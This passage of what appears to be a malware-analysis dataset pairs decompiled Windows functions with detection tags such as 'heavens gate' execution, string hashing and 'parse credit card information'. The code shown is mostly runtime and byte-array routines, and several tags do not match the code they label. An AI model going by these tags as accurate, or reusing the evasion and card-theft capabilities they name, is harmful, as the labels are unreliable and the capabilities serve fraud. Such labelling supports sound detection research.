        "decompiled_code": "\nchar * fcn.1400941a0(uchar *arg1, char **arg2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t arg2_00;\n    ulong in_R8;\n    uchar auStack88 [24];\n    \n    pcVar3 = *arg2;\n    *(arg1 + 8) = arg2;\n    *arg1 = 0;\n    iVar2 = *(pcVar3 + -0x18) + arg2;\n    pcVar3 = *(iVar2 + 0xd8);\n    uVar4 = *(iVar2 + 0x20);\n    if (pcVar3 != NULL) {\n        if (uVar4 != 0) goto code_r0x0001400941d0;\n        fcn.140093c60(pcVar3);\n        pcVar3 = *arg2;\n        iVar2 = arg2 + *(pcVar3 + -0x18);\n    }\n    uVar4 = *(iVar2 + 0x20);\n    if (uVar4 == 0) {\n        *arg1 = 1;\n        return pcVar3;\n    }\ncode_r0x0001400941d0:\n    if ((uVar4 & 1) == 0) {\n        return pcVar3;\n    }\n    uVar5 = uVar4 | 4;\n    if (*(iVar2 + 0xe8) == 0) {\n        uVar5 = uVar4 | 5;\n    }\n    *(iVar2 + 0x20) = uVar5;\n    uVar5 = uVar5 & *(iVar2 + 0x1c);\n    arg2_00 = uVar5;\n    if (uVar5 == 0) {\n        return pcVar3;\n    }\n    pcVar3 = \"basic_ios::clear\";\n    fcn.1400bd8d0(\"basic_ios::clear\");\n    fcn.1400a59d0(pcVar3, arg2_00 + 0xd0);\n    fcn.1400b3230(auStack88, arg2_00, in_R8);\n    fcn.1400a5ae0(auStack88);\n    fcn.1400b51a0(arg2_00, in_R8);\n    piVar1 = *(arg2_00 + 0xe8);\n    if (piVar1 != NULL) {\n        fcn.1400a59d0(auStack88, piVar1 + 7);\n        (**(*piVar1 + 0x10))(piVar1, in_R8);\n        fcn.1400a5b40(piVar1 + 7, in_R8);\n        fcn.1400a5ae0(auStack88);\n    }\n    return pcVar3;\n}\n",
        "token_count": 634
    },
    "1400bca1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t * fcn.1400bca10(void)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    \n    ppiVar1 = fcn.1400bcb60();\n    piVar2 = *ppiVar1;\n    if (piVar2 != NULL) {\n        if ((*(piVar2 + 10) & 1) != 0) {\n            piVar2 = *piVar2 + -0x90;\n        }\n        piVar2 = *piVar2;\n    }\n    return piVar2;\n}\n",
        "token_count": 126
    },
    "1400016f": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.1400016f8(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x7a;\n    arg1[1] = 7;\n    arg1[2] = 0x7a;\n    arg1[3] = 6;\n    arg1[4] = 0x52;\n    arg1[5] = 0x43;\n    arg1[6] = 0x71;\n    arg1[7] = 0x58;\n    arg1[8] = 0x74;\n    arg1[9] = 0xf;\n    arg1[10] = 0x53;\n    arg1[0xb] = 6;\n    arg1[0xc] = 0x76;\n    arg1[0xd] = 0x31;\n    arg1[0xe] = 0x75;\n    arg1[0xf] = 0x2a;\n    arg1[0x10] = 0x33;\n    arg1[0x11] = 9;\n    arg1[0x12] = 0xb;\n    arg1[0x13] = 0x70;\n    arg1[0x14] = 0x7b;\n    arg1[0x15] = 0x79;\n    arg1[0x16] = 4;\n    arg1[0x17] = 0x2a;\n    arg1[0x18] = 0;\n    arg1[0x19] = 3;\n    arg1[0x1a] = 0x1f;\n    arg1[0x1b] = 0x2d;\n    arg1[0x1c] = 0x66;\n    arg1[0x1d] = 0x2b;\n    arg1[0x1e] = 0x1b;\n    arg1[0x1f] = 0x19;\n    arg1[0x20] = 0x13;\n    arg1[0x21] = 0x32;\n    arg1[0x22] = 0x3f;\n    arg1[0x23] = 0x2e;\n    arg1[0x24] = 0x68;\n    arg1[0x25] = 0x2d;\n    arg1[0x26] = 0x6f;\n    arg1[0x27] = 0x30;\n    arg1[0x28] = 4;\n    arg1[0x29] = 0x6b;\n    arg1[0x2a] = 0x29;\n    arg1[0x2b] = 0x1a;\n    arg1[0x2c] = 0x52;\n    arg1[0x2d] = 0x56;\n    arg1[0x2e] = 0x10;\n    arg1[0x2f] = 0x57;\n    arg1[0x30] = 0x34;\n    arg1[0x31] = 0x65;\n    return arg1;\n}\n",
        "token_count": 723
    },
    "140001ce": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.140001ce2(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x4d;\n    arg1[1] = 0x6c;\n    arg1[2] = 0x61;\n    arg1[3] = 0x51;\n    arg1[4] = 0x7c;\n    arg1[5] = 0x5b;\n    arg1[6] = 0x77;\n    arg1[7] = 0x79;\n    arg1[8] = 0x50;\n    arg1[9] = 0x4e;\n    arg1[10] = 0x5b;\n    arg1[0xb] = 0x75;\n    arg1[0xc] = 0x30;\n    arg1[0xd] = 0x20;\n    arg1[0xe] = 0xf;\n    arg1[0xf] = 0x29;\n    arg1[0x10] = 0xd;\n    arg1[0x11] = 0;\n    arg1[0x12] = 0x16;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0x27;\n    arg1[0x15] = 0x39;\n    arg1[0x16] = 0x2f;\n    arg1[0x17] = 0x25;\n    arg1[0x18] = 0x29;\n    arg1[0x19] = 0x29;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x38;\n    arg1[0x1d] = 0x34;\n    arg1[0x1e] = 0x72;\n    arg1[0x1f] = 0x27;\n    arg1[0x20] = 0x35;\n    arg1[0x21] = 0x27;\n    arg1[0x22] = 0x31;\n    arg1[0x23] = 0x32;\n    arg1[0x24] = 0x2c;\n    arg1[0x25] = 0x79;\n    arg1[0x26] = 0x2a;\n    arg1[0x27] = 0x29;\n    arg1[0x28] = 0x33;\n    arg1[0x29] = 0x3e;\n    arg1[0x2a] = 0x3b;\n    arg1[0x2b] = 0x2c;\n    arg1[0x2c] = 0x13;\n    arg1[0x2d] = 0x41;\n    arg1[0x2e] = 0x11;\n    arg1[0x2f] = 0x16;\n    arg1[0x30] = 7;\n    arg1[0x31] = 0;\n    arg1[0x32] = 0x15;\n    arg1[0x33] = 0x14;\n    arg1[0x34] = 0xe;\n    arg1[0x35] = 0x1c;\n    arg1[0x36] = 0x58;\n    arg1[0x37] = 0x59;\n    arg1[0x38] = 0x4f;\n    arg1[0x39] = 0x19;\n    arg1[0x3a] = 0x38;\n    return arg1;\n}\n",
        "token_count": 859
    },
    "140001ec": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.140001ecc(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x7e;\n    arg1[1] = 100;\n    arg1[2] = 0x57;\n    arg1[3] = 0x6f;\n    arg1[4] = 0x6d;\n    arg1[5] = 0x4a;\n    arg1[6] = 0x62;\n    arg1[7] = 0x41;\n    arg1[8] = 0x73;\n    arg1[9] = 0x49;\n    arg1[10] = 0x7a;\n    arg1[0xb] = 0x7a;\n    arg1[0xc] = 0x30;\n    arg1[0xd] = 8;\n    arg1[0xe] = 0x38;\n    arg1[0xf] = 5;\n    arg1[0x10] = 0xc;\n    arg1[0x11] = 0x20;\n    arg1[0x12] = 0x3f;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0xe;\n    arg1[0x15] = 8;\n    arg1[0x16] = 3;\n    arg1[0x17] = 7;\n    arg1[0x18] = 9;\n    arg1[0x19] = 9;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x33;\n    arg1[0x1f] = 0x3f;\n    arg1[0x20] = 0x38;\n    arg1[0x21] = 0x3a;\n    arg1[0x22] = 0x35;\n    arg1[0x23] = 0x36;\n    arg1[0x24] = 0x2c;\n    arg1[0x25] = 0x3c;\n    arg1[0x26] = 0x7a;\n    arg1[0x27] = 0x36;\n    arg1[0x28] = 0x39;\n    arg1[0x29] = 0x30;\n    arg1[0x2a] = 0x31;\n    arg1[0x2b] = 0x2d;\n    arg1[0x2c] = 0x19;\n    arg1[0x2d] = 0x41;\n    arg1[0x2e] = 0xb;\n    arg1[0x2f] = 0xd;\n    arg1[0x30] = 0x44;\n    arg1[0x31] = 0x11;\n    arg1[0x32] = 0xe;\n    arg1[0x33] = 2;\n    arg1[0x34] = 0x48;\n    arg1[0x35] = 10;\n    arg1[0x36] = 0x41;\n    arg1[0x37] = 0x47;\n    arg1[0x38] = 0x44;\n    arg1[0x39] = 0x52;\n    arg1[0x3a] = 0x56;\n    arg1[0x3b] = 0x4d;\n    arg1[0x3c] = 0x1a;\n    arg1[0x3d] = 0x4b;\n    arg1[0x3e] = 0x4e;\n    arg1[0x3f] = 0x52;\n    arg1[0x40] = 0x5d;\n    arg1[0x41] = 0x5a;\n    arg1[0x42] = 0x33;\n    arg1[0x43] = 0x32;\n    arg1[0x44] = 0x6e;\n    arg1[0x45] = 99;\n    arg1[0x46] = 0x21;\n    arg1[0x47] = 0x3d;\n    arg1[0x48] = 0x2f;\n    arg1[0x49] = 0x33;\n    arg1[0x4a] = 0x21;\n    arg1[0x4b] = 0x27;\n    arg1[0x4c] = 0x2d;\n    arg1[0x4d] = 0x71;\n    arg1[0x4e] = 0x6c;\n    arg1[0x4f] = 0x4d;\n    return arg1;\n}\n",
        "token_count": 1157
    },
    "1400023b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.1400023b8(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x61;\n    arg1[1] = 0x76;\n    arg1[2] = 0x7f;\n    arg1[3] = 0x5b;\n    arg1[4] = 0x69;\n    arg1[5] = 0x48;\n    arg1[6] = 0x5c;\n    arg1[7] = 0x70;\n    arg1[8] = 0x45;\n    arg1[9] = 0x4d;\n    arg1[10] = 0x44;\n    arg1[0xb] = 0x6b;\n    arg1[0xc] = 0xd;\n    arg1[0xd] = 0xc;\n    arg1[0xe] = 0x1b;\n    arg1[0xf] = 10;\n    arg1[0x10] = 0x17;\n    arg1[0x11] = 0x3d;\n    arg1[0x12] = 0x14;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0xe;\n    arg1[0x15] = 8;\n    arg1[0x16] = 3;\n    arg1[0x17] = 7;\n    arg1[0x18] = 9;\n    arg1[0x19] = 9;\n    arg1[0x1a] = 0x6e;\n    arg1[0x1b] = 0x3b;\n    arg1[0x1c] = 0x3f;\n    arg1[0x1d] = 0x71;\n    arg1[0x1e] = 0x25;\n    arg1[0x1f] = 0x21;\n    arg1[0x20] = 0x3d;\n    arg1[0x21] = 0x21;\n    arg1[0x22] = 0x33;\n    arg1[0x23] = 0x77;\n    arg1[0x24] = 0x3c;\n    arg1[0x25] = 0x3c;\n    arg1[0x26] = 0x39;\n    arg1[0x27] = 0x34;\n    arg1[0x28] = 0x38;\n    arg1[0x29] = 0x38;\n    arg1[0x2a] = 0x3a;\n    arg1[0x2b] = 0x7f;\n    arg1[0x2c] = 0x10;\n    arg1[0x2d] = 0;\n    arg1[0x2e] = 0x1b;\n    arg1[0x2f] = 0xf;\n    arg1[0x30] = 0xb;\n    arg1[0x31] = 4;\n    arg1[0x32] = 2;\n    arg1[0x33] = 0x47;\n    arg1[0x34] = 0x1c;\n    arg1[0x35] = 6;\n    arg1[0x36] = 0x14;\n    arg1[0x37] = 0x54;\n    arg1[0x38] = 0x5a;\n    arg1[0x39] = 0x5b;\n    arg1[0x3a] = 0x57;\n    arg1[0x3b] = 0x5a;\n    arg1[0x3c] = 0x5b;\n    arg1[0x3d] = 0x4f;\n    arg1[0x3e] = 0x59;\n    arg1[0x3f] = 0x59;\n    arg1[0x40] = 0x1e;\n    arg1[0x41] = 0x52;\n    arg1[0x42] = 0x25;\n    arg1[0x43] = 0x2c;\n    arg1[0x44] = 0x2d;\n    arg1[0x45] = 0x31;\n    arg1[0x46] = 0x3d;\n    arg1[0x47] = 0x7f;\n    arg1[0x48] = 0x66;\n    arg1[0x49] = 0x47;\n    return arg1;\n}\n",
        "token_count": 1070
    },
    "14000261": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.14000261a(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x61;\n    arg1[1] = 0x76;\n    arg1[2] = 0x7f;\n    arg1[3] = 0x5b;\n    arg1[4] = 0x69;\n    arg1[5] = 0x48;\n    arg1[6] = 0x5c;\n    arg1[7] = 0x70;\n    arg1[8] = 0x45;\n    arg1[9] = 0x4d;\n    arg1[10] = 0x44;\n    arg1[0xb] = 0x6b;\n    arg1[0xc] = 0xd;\n    arg1[0xd] = 0xc;\n    arg1[0xe] = 0x1b;\n    arg1[0xf] = 10;\n    arg1[0x10] = 0x17;\n    arg1[0x11] = 0x3d;\n    arg1[0x12] = 0x14;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0x3f;\n    arg1[0x15] = 0x3b;\n    arg1[0x16] = 0x25;\n    arg1[0x17] = 0x3f;\n    arg1[0x18] = 0x29;\n    arg1[0x19] = 0x6d;\n    arg1[0x1a] = 0x2a;\n    arg1[0x1b] = 0x2a;\n    arg1[0x1c] = 0x33;\n    arg1[0x1d] = 0x3e;\n    arg1[0x1e] = 0x36;\n    arg1[0x1f] = 0x36;\n    arg1[0x20] = 0x30;\n    arg1[0x21] = 0x75;\n    arg1[0x22] = 0x26;\n    arg1[0x23] = 0x36;\n    arg1[0x24] = 0x21;\n    arg1[0x25] = 0x35;\n    arg1[0x26] = 0x35;\n    arg1[0x27] = 0x3a;\n    arg1[0x28] = 0x38;\n    arg1[0x29] = 0x7d;\n    arg1[0x2a] = 0x2a;\n    arg1[0x2b] = 0x30;\n    arg1[0x2c] = 0x40;\n    arg1[0x2d] = 0;\n    arg1[0x2e] = 0xe;\n    arg1[0x2f] = 0xf;\n    arg1[0x30] = 0xb;\n    arg1[0x31] = 6;\n    arg1[0x32] = 7;\n    arg1[0x33] = 0x13;\n    arg1[0x34] = 0xd;\n    arg1[0x35] = 0xd;\n    arg1[0x36] = 0x14;\n    arg1[0x37] = 0x58;\n    arg1[0x38] = 0x53;\n    arg1[0x39] = 0x5a;\n    arg1[0x3a] = 0x57;\n    arg1[0x3b] = 0x4b;\n    arg1[0x3c] = 0x43;\n    arg1[0x3d] = 0x1b;\n    arg1[0x3e] = 0x4f;\n    arg1[0x3f] = 0x48;\n    arg1[0x40] = 0x5d;\n    arg1[0x41] = 0x5c;\n    arg1[0x42] = 0x25;\n    arg1[0x43] = 0x32;\n    arg1[0x44] = 0x31;\n    arg1[0x45] = 0x25;\n    arg1[0x46] = 0x31;\n    arg1[0x47] = 0x29;\n    arg1[0x48] = 0x2a;\n    arg1[0x49] = 0x3e;\n    arg1[0x4a] = 0x66;\n    arg1[0x4b] = 0x49;\n    return arg1;\n}\n",
        "token_count": 1107
    },
    "14000374": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuchar * fcn.140003744(uchar *arg1, ulong arg2)\n\n{\n    ulong var_10h;\n    ulong var_18h;\n    \n    *arg1 = 0x44;\n    arg1[1] = 0x58;\n    arg1[2] = 0x54;\n    arg1[3] = 0x7e;\n    arg1[4] = 0x4d;\n    arg1[5] = 99;\n    arg1[6] = 0x4c;\n    arg1[7] = 0x57;\n    arg1[8] = 0x4f;\n    arg1[9] = 0x6d;\n    arg1[10] = 0x4a;\n    arg1[0xb] = 0x4d;\n    arg1[0xc] = 0x18;\n    arg1[0xd] = 0x34;\n    arg1[0xe] = 0x29;\n    arg1[0xf] = 0x15;\n    arg1[0x10] = 0x2c;\n    arg1[0x11] = 0xc;\n    arg1[0x12] = 0;\n    arg1[0x13] = 0x67;\n    arg1[0x14] = 0x3a;\n    arg1[0x15] = 0x2c;\n    arg1[0x16] = 0x39;\n    arg1[0x17] = 0x3e;\n    arg1[0x18] = 0x21;\n    arg1[0x19] = 0x28;\n    arg1[0x1a] = 0x2a;\n    arg1[0x1b] = 0x6f;\n    arg1[0x1c] = 0x33;\n    arg1[0x1d] = 0x23;\n    arg1[0x1e] = 0x37;\n    arg1[0x1f] = 0x32;\n    arg1[0x20] = 0x20;\n    arg1[0x21] = 0x30;\n    arg1[0x22] = 0x32;\n    arg1[0x23] = 0x77;\n    arg1[0x24] = 0x2c;\n    arg1[0x25] = 0x31;\n    arg1[0x26] = 0x28;\n    arg1[0x27] = 0x3e;\n    arg1[0x28] = 0x3d;\n    arg1[0x29] = 0x39;\n    arg1[0x2a] = 0x7e;\n    arg1[0x2b] = 0x2c;\n    arg1[0x2c] = 0x15;\n    arg1[0x2d] = 2;\n    arg1[0x2e] = 1;\n    arg1[0x2f] = 6;\n    arg1[0x30] = 0x17;\n    arg1[0x31] = 0x16;\n    arg1[0x32] = 0;\n    arg1[0x33] = 0x12;\n    arg1[0x34] = 4;\n    arg1[0x35] = 5;\n    arg1[0x36] = 0x4d;\n    arg1[0x37] = 0x1b;\n    arg1[0x38] = 0x36;\n    return arg1;\n}\n",
        "token_count": 825
    },
    "14000c02": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nuint * fcn.14000c020(int64_t arg1)\n\n{\n    char **ppcVar1;\n    uint uVar2;\n    char *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    int64_t iVar6;\n    uint *puVar7;\n    ulong arg3;\n    int32_t iVar8;\n    char cVar9;\n    int32_t iVar10;\n    char cVar11;\n    bool bVar12;\n    bool bVar13;\n    \n    pcVar3 = *(arg1 + 0x18);\n    cVar11 = *pcVar3;\n    if (cVar11 == '\\0') {\n        cVar9 = '\\0';\n    }\n    else {\n        *(arg1 + 0x18) = pcVar3 + 1;\n        cVar9 = pcVar3[1];\n        cVar11 = *pcVar3;\n        if (cVar9 != '\\0') {\n            *(arg1 + 0x18) = pcVar3 + 2;\n            cVar9 = pcVar3[1];\n            if (cVar11 == 'v') {\n                if (cVar9 - 0x30U < 10) {\n                    iVar6 = fcn.14000aff0(arg1);\n                    iVar8 = *(arg1 + 0x28);\n                    if (*(arg1 + 0x2c) <= iVar8) {\n                        return NULL;\n                    }\n                    puVar7 = iVar8 * 0x20 + *(arg1 + 0x20);\n                    *(puVar7 + 1) = 0;\n                    *(arg1 + 0x28) = iVar8 + 1;\n                    if (iVar6 == 0) {\n                        return NULL;\n                    }\n                    *(puVar7 + 1) = 0;\n                    *puVar7 = 0x33;\n                    puVar7[4] = cVar9 - 0x30U;\n                    *(puVar7 + 6) = iVar6;\n                    return puVar7;\n                }\n            }\n            else if ((cVar11 == 'c') && (cVar9 == 'v')) {\n                uVar2 = *(arg1 + 0x50);\n                *(arg1 + 0x50) = *(arg1 + 0x4c) == 0;\n                arg3 = fcn.14000b340(arg1);\n                if (*(arg1 + 0x50) == 0) {\n                    puVar7 = fcn.14000a670(arg1, 0x34, arg3, 0);\n                }\n                else {\n                    puVar7 = fcn.14000a670(arg1, 0x35, arg3, 0);\n                }\n                *(arg1 + 0x50) = uVar2;\n                return puVar7;\n            }\n        }\n    }\n    iVar10 = 0x48;\n    iVar8 = 0;\n    do {\n        iVar5 = (iVar10 - iVar8) / 2 + iVar8;\n        ppcVar1 = iVar5 * 0x18 + 0x14010d120;\n        pcVar3 = *ppcVar1;\n        bVar13 = SBORROW1(*pcVar3, cVar11);\n        cVar4 = *pcVar3 - cVar11;\n        bVar12 = *pcVar3 == cVar11;\n        if (bVar12) {\n            bVar13 = SBORROW1(pcVar3[1], cVar9);\n            cVar4 = pcVar3[1] - cVar9;\n            bVar12 = cVar4 == '\\0';\n            if (bVar12) {\n                iVar8 = *(arg1 + 0x28);\n                if (*(arg1 + 0x2c) <= iVar8) {\n                    return NULL;\n                }\n                puVar7 = iVar8 * 0x20 + *(arg1 + 0x20);\n                *(puVar7 + 1) = 0;\n                *(arg1 + 0x28) = iVar8 + 1;\n                *puVar7 = 0x32;\n                *(puVar7 + 4) = ppcVar1;\n                return puVar7;\n            }\n        }\n        if (bVar12 || bVar13 != cVar4 < '\\0') {\n            iVar8 = iVar5 + 1;\n            iVar5 = iVar10;\n        }\n        iVar10 = iVar5;\n    } while (iVar8 != iVar10);\n    return NULL;\n}\n",
        "token_count": 986
    },
    "14000a67": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint32_t * fcn.14000a670(int64_t arg1, ulong arg2, int64_t arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    uint32_t *puVar3;\n    \n    if (arg2 < 0x32) {\n        if (arg2 < 0x29) {\n            uVar2 = 1 << (arg2 & 0x3f);\n            if ((uVar2 & 0x17c00fff600) == 0) {\n                if ((uVar2 & 0x1fe000000) == 0) {\n                    if ((uVar2 & 0x20000081e) == 0) {\n                        return NULL;\n                    }\n                    goto code_r0x00014000a74f;\n                }\n            }\n            else {\ncode_r0x00014000a69e:\n                if (arg3 == 0) {\n                    return NULL;\n                }\n            }\n        }\n        else {\n            if (8 < arg2 - 0x29) {\n                return NULL;\n            }\n    // switch table (9 cases) at 0x14010c140\n            switch(*((arg2 - 0x29) * 4 + 0x14010c140) + 0x14010c140) {\n            case 0x14000a69e:\n                goto code_r0x00014000a69e;\n            case 0x14000a707:\n                goto code_r0x00014000a707;\n            case 0x14000a74f:\ncode_r0x00014000a74f:\n                if (arg3 == 0) {\n                    return NULL;\n                }\n            case 0x14000a754:\n                if (arg4 == 0) {\n                    return NULL;\n                }\n            }\n        }\n    }\n    else {\n        if (0x1d < arg2 - 0x34) {\n            return NULL;\n        }\n        uVar2 = 1 << (arg2 - 0x34 & 0x3f);\n        if ((uVar2 & 0x1c71107) != 0) goto code_r0x00014000a69e;\n        if ((uVar2 & 0xa002ef8) != 0) goto code_r0x00014000a74f;\n        if ((uVar2 & 0x34000000) == 0) {\n            return NULL;\n        }\n    }\n    iVar1 = *(arg1 + 0x28);\n    if (iVar1 < *(arg1 + 0x2c)) {\n        puVar3 = iVar1 * 0x20 + *(arg1 + 0x20);\n        *(puVar3 + 1) = 0;\n        *(arg1 + 0x28) = iVar1 + 1;\n        *puVar3 = arg2;\n        *(puVar3 + 4) = arg3;\n        *(puVar3 + 6) = arg4;\n        return puVar3;\n    }\ncode_r0x00014000a707:\n    return NULL;\n}\n",
        "token_count": 687
    },
    "14000a77": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint * fcn.14000a770(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    \n    iVar1 = *(arg1 + 0x28);\n    if (iVar1 < *(arg1 + 0x2c)) {\n        puVar2 = iVar1 * 0x20 + *(arg1 + 0x20);\n        *(puVar2 + 1) = 0;\n        *(arg1 + 0x28) = iVar1 + 1;\n        if ((arg2 != 0) && (0 < arg3)) {\n            *(puVar2 + 1) = 0;\n            *puVar2 = 0;\n            *(puVar2 + 4) = arg2;\n            puVar2[6] = arg3;\n            return puVar2;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 202
    },
    "14000aeb": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint * fcn.14000aeb0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char *pcVar5;\n    \n    pcVar2 = *(arg1 + 0x18);\n    if (*pcVar2 != 'T') {\n        return NULL;\n    }\n    pcVar5 = pcVar2 + 1;\n    *(arg1 + 0x18) = pcVar5;\n    if (pcVar2[1] == '_') {\n        iVar3 = 0;\n    }\n    else {\n        if (pcVar2[1] == 'n') {\n            return NULL;\n        }\n        iVar3 = fcn.14000a7d0(arg1);\n        iVar3 = iVar3 + 1;\n        if (iVar3 < 0) {\n            return NULL;\n        }\n        pcVar5 = *(arg1 + 0x18);\n        if (*pcVar5 != '_') {\n            return NULL;\n        }\n    }\n    *(arg1 + 0x18) = pcVar5 + 1;\n    iVar1 = *(arg1 + 0x28);\n    if (*(arg1 + 0x2c) <= iVar1) {\n        return NULL;\n    }\n    puVar4 = iVar1 * 0x20 + *(arg1 + 0x20);\n    *(puVar4 + 1) = 0;\n    *(arg1 + 0x28) = iVar1 + 1;\n    *puVar4 = 5;\n    puVar4[4] = iVar3;\n    return puVar4;\n}\n",
        "token_count": 364
    },
    "14000aff": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nuint * fcn.14000aff0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t *arg2;\n    uint32_t uVar2;\n    char *pcVar3;\n    uint *puVar4;\n    \n    uVar2 = fcn.14000a7d0(arg1);\n    if (uVar2 < 1) {\n        return NULL;\n    }\n    arg2 = *(arg1 + 0x18);\n    if (uVar2 <= *(arg1 + 8) - arg2) {\n        pcVar3 = uVar2 + arg2;\n        *(arg1 + 0x18) = pcVar3;\n        if (((*(arg1 + 0x10) & 4) != 0) && (*pcVar3 == '$')) {\n            *(arg1 + 0x18) = pcVar3 + 1;\n        }\n        if ((((uVar2 < 10) || (*arg2 != 0x5f4c41424f4c475f)) || (0x3b < *(arg2 + 1) - 0x24)) ||\n           (((0xf7fffffffffffbfeU >> (*(arg2 + 1) - 0x24 & 0x3f) & 1) != 0 || (*(arg2 + 9) != 'N')))) {\n            puVar4 = fcn.14000a770(arg1, arg2, uVar2);\n            goto code_r0x00014000b058;\n        }\n        iVar1 = *(arg1 + 0x28);\n        *(arg1 + 0x48) = (*(arg1 + 0x48) + 0x16) - uVar2;\n        if (iVar1 < *(arg1 + 0x2c)) {\n            *(arg1 + 0x28) = iVar1 + 1;\n            puVar4 = iVar1 * 0x20 + *(arg1 + 0x20);\n            *(puVar4 + 1) = 0;\n            *puVar4 = 0;\n            *(puVar4 + 4) = \"(anonymous namespace)\";\n            puVar4[6] = 0x15;\n            goto code_r0x00014000b058;\n        }\n    }\n    puVar4 = NULL;\ncode_r0x00014000b058:\n    *(arg1 + 0x40) = puVar4;\n    return puVar4;\n}\n",
        "token_count": 539
    },
    "14001dae": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t fcn.14001dae0(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iStack48;\n    int32_t aiStack44 [3];\n    \n    fcn.14001d7b0(arg1, &iStack48);\n    fcn.14001d7b0(arg2, aiStack44);\n    return (((*(arg1 + 0x14) - *(arg2 + 0x14)) * 0x20 + iStack48) - aiStack44[0]) * 0x100000;\n}\n",
        "token_count": 125
    },
    "14000a7d": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
